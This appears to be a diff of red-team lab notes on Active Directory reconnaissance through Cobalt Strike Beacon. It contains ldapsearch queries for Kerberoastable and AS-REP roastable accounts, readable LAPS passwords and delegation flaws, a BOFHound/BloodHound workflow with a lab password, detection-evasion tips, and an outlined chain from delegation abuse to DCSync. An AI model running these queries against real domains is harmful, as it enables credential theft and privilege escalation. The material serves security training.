@@ -11,14 +11,14 @@ kerberos_ticket_use C:\path\to\rsteel.kirbi
 ldapsearch (samAccountType=805306369) --attributes name,dnsHostName,operatingSystem
 ```
 
-## Domain-Level LDAPSEARCH Paths OPSEC-🟢SAFE
+## Domain-Level LDAPSEARCH    
 
 ```cs
 // GPO abuse — find GPOs applied to current machine/user OUs where we can write
 ldapsearch (&(objectClass=groupPolicyContainer)) --attributes displayName,gPCFileSysPath,ntsecuritydescriptor
 
 // Kerberoastable accounts (SPN holders) — weak password = privesc path
-ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes samAccountName,servicePrincipalName,memberOf
+ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes name,samAccountName,servicePrincipalName,memberOf
 
 // LAPS — find computers where current user can read ms-Mcs-AdmPwd
 ldapsearch (&(objectClass=computer)(ms-Mcs-AdmPwd=*)) --attributes name,ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime
@@ -28,29 +28,82 @@ ldapsearch (&(adminCount=1)(objectClass=user)) --attributes samAccountName,membe
 
 // Delegation misconfig — unconstrained delegation (TGT theft risk)
 ldapsearch (&(samAccountType=805306369)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes name,userAccountControl,msDS-AllowedToDelegateTo
-```
 
-## BOFHound
-
-1. Launch Cobalt Strike and connect to the team server.
-2. Interact with the Beacon.
-3. Enumerate the domain, users, groups, OUs, and GPOs.
-
-```Beacon-nocolor
+// 🧠 BOFHound 📂 output 📝 logs❗
 ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
 ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor
 ```
 
-1. Copy the raw Beacon logs to the Attacker Desktop.
-  1. From the Windows 🖥️Terminal, open a tab for Ubuntu🟣🐧.
+## Delegation LDAPSEARCH  
+
+```cs
+// Unconstrained delegation — any computer/user with unconstrained delegation
+
+// If a server has this, force a DC to auth to it → capture DC TGT → DCSync → DA
+ldapsearch (userAccountControl:1.2.840.113556.1.4.803:=524288) --attributes samAccountName,servicePrincipalName,userAccountControl
+
+// Constrained delegation — can impersonate any user to the delegated service
+// msDS-AllowedToDelegateTo set = protocol transition possible
+ldapsearch (msDS-AllowedToDelegateTo=*) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
+
+// Resource-based constrained delegation (RBCD) — target can impersonate on behalf of another
+ldapsearch (msDS-AllowedToActOnBehalfOfOtherIdentity=*) --attributes samAccountName,msDS-AllowedToActOnBehalfOfOtherIdentity
+```
+
+## Kerberoast AS-REP Targets LDAPSEARCH
+
+```cs
+
+// Kerberoastable service accounts — has SPN, not krbtgt, not disabled
+ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes samAccountName,servicePrincipalName
+
+// AS-REP roastable — no Kerberos pre-authentication required
+// Can request AS-REP hash without any credentials
+ldapsearch (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --attributes samAccountName
+
+// Accounts with descriptions — operators sometimes store passwords in the description field
+ldapsearch (&(samAccountType=805306368)(description=*)) --attributes samAccountName,description
+```
+
+## LAPS LDAPSEARCH
+
+```cs
+// LAPS — if ms-Mcs-AdmPwd is readable, you get the local admin password for that host 
+ldapsearch (ms-Mcs-AdmPwd=*) --attributes name,ms-Mcs-AdmPwd
+```
+
+## Privileged account LDAPSEARCH
+
+```cs
+// AdminCount=1 user accounts — all accounts under AdminSDHolder protection
+// These are privileged — DA, EA, Schema Admins, Backup Operators, etc.
+ldapsearch (&(adminCount=1)(samAccountType=805306368)) --attributes samAccountName,memberOf
+
+// Domain trust enumeration
+ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
+
+// trustDirection: 1=INBOUND, 2=OUTBOUND, 3=BIDIRECTIONAL
+// trustAttributes: 32=WITHIN_FOREST (parent-child), 8=FOREST_TRANSITIVE (cross-forest)
+```
+
+----  
+
+## BOFHound  
+
+1. Launch Cobalt Strike and connect to the team server.
+2. Interact with the Beacon.
+3. `ldapsearch` Enumerate the domain, users, groups, OUs, and GPOs.
+4. Copy the raw Beacon logs to the Attacker Desktop.  
+
+  1. From the Windows 🖥️ Terminal, open a tab for Ubuntu🟣🐧.
   2. `cd /mnt/c/Users/Attacker/Desktop`
   3. `scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .`
-  4. The password is `Passw0rd!`.
+  4. The password is `Passw0rd!`.  
 
-1. Parse the logs with BOFHound🧠
+5. 🧠 BOFHound 📂 output 📝 logs❗parsed for BloodHound❗  
   1. `bofhound -i logs`
 
-===
+----  
 
 ## BloodHound
 
@@ -114,64 +167,7 @@ ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType
 
 BloodHound will now show that rsteel has local administrative privileges on WKSTN-1 and 2.
 
-⚠️ In this lab, you have used LDAP queries and BloodHound to map part of the CONTOSO domain.
-
-
-## Additional ldapsearch Queries — Exam-Day Privilege Path Finding
-
-The two Step 3 queries feed BOFHound 🧠 BloodHound and give the full domain picture.
-Run these targeted queries in parallel to find quick privilege escalation paths before `BloodHound` finishes processing.
-All run as BOF — `OPSEC-🟢SAFE`.
-
-### Delegation — highest value for privilege escalation
-
-```cs
-// Unconstrained delegation — any computer/user with unconstrained delegation
-// If a server has this, force a DC to auth to it → capture DC TGT → DCSync → DA
-beacon> ldapsearch (userAccountControl:1.2.840.113556.1.4.803:=524288) --attributes samAccountName,servicePrincipalName,userAccountControl
-
-// Constrained delegation — can impersonate any user to the delegated service
-// msDS-AllowedToDelegateTo set = protocol transition possible
-beacon> ldapsearch (msDS-AllowedToDelegateTo=*) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
-
-// Resource-based constrained delegation (RBCD) — target can impersonate on behalf of another
-beacon> ldapsearch (msDS-AllowedToActOnBehalfOfOtherIdentity=*) --attributes samAccountName,msDS-AllowedToActOnBehalfOfOtherIdentity
-```
-
-### Quick credential attack targets
-
-```cs
-// Kerberoastable service accounts — has SPN, not krbtgt, not disabled
-beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes samAccountName,servicePrincipalName
-
-// AS-REP roastable — no Kerberos pre-authentication required
-// Can request AS-REP hash without any credentials
-beacon> ldapsearch (&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --attributes samAccountName
-
-// Accounts with descriptions — operators sometimes store passwords in the description field
-beacon> ldapsearch (&(samAccountType=805306368)(description=*)) --attributes samAccountName,description
-```
-
-### Local admin access via LAPS
-
-```cs
-// LAPS — if ms-Mcs-AdmPwd is readable, you get the local admin password for that host
-// Gives instant lateral movement without Kerberoasting or cracking
-beacon> ldapsearch (ms-Mcs-AdmPwd=*) --attributes name,ms-Mcs-AdmPwd
-```
-
-### Privileged account identification
-
-```cs
-// AdminCount=1 user accounts — all accounts under AdminSDHolder protection
-// These are privileged — DA, EA, Schema Admins, Backup Operators, etc.
-beacon> ldapsearch (&(adminCount=1)(samAccountType=805306368)) --attributes samAccountName,memberOf
-
-// Domain trust enumeration
-beacon> ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
-// trustDirection: 1=INBOUND, 2=OUTBOUND, 3=BIDIRECTIONAL
-// trustAttributes: 32=WITHIN_FOREST (parent-child), 8=FOREST_TRANSITIVE (cross-forest)
-```
+⚠️ In this lab, you have used LDAP queries and BloodHound to map part of the CONTOSO domain.  
 
 ---
 
@@ -193,8 +189,8 @@ retrieved 0 results total
 
 ### OPSEC-🔴UNSAFE Never Use⛔
 
-`net computers` ⛔ `net *` OPSEC-🔴UNSAFE beacon commands run via the `shell` built-in which spawns
-`cmd.exe` — OPSEC-🔴UNSAFE. ⛔ fails with Error 5 from a network logon token.
-| `net computers` | OPSEC-🔴UNSAFEE — spawns cmd.exe | `ldapsearch (samAccountType=805306369)` |
-| `net users` | OPSEC-🔴UNSAFE — spawns cmd.exe | `ldapsearch (samAccountType=805306368)` |
-| `net groups` | OPSEC-🔴UNSAFE — spawns cmd.exe | `ldapsearch (samAccountType=268435456)` |
+`net computers` ⛔ `net *` OPSEC-🔴UNSAFE beacon commands run via the `shell` built-in which spawns  
+`cmd.exe` — OPSEC-🔴UNSAFE. ⛔ fails with Error 5 from a network logon token.  
+`net computers`  OPSEC-🔴UNSAFEE — spawns cmd.exe   `ldapsearch (samAccountType=805306369)`  
+`net users`   OPSEC-🔴UNSAFE — spawns cmd.exe   `ldapsearch (samAccountType=805306368)`  
+`net groups`  OPSEC-🔴UNSAFE — spawns cmd.exe  `ldapsearch (samAccountType=268435456)`  
